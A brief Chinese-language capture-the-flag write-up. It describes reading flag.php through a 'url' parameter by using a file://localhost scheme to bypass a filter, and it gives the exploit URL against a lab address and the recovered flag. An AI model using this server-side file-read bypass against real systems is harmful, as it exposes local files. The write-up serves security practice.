
# writeup

根据提示, flag.php在目录下, 但是直接访问没结果

访问文件目录也报错, 于是带上localhost使用file://localhost绕过

`http://39.104.60.50:18946/?url=file://localhost/var/www/html/flag.php`

这次不报错了, 查看源码, flag隐含在注释中

`flag{9a10a452de30c04945f5ec0297f4d9e1}`
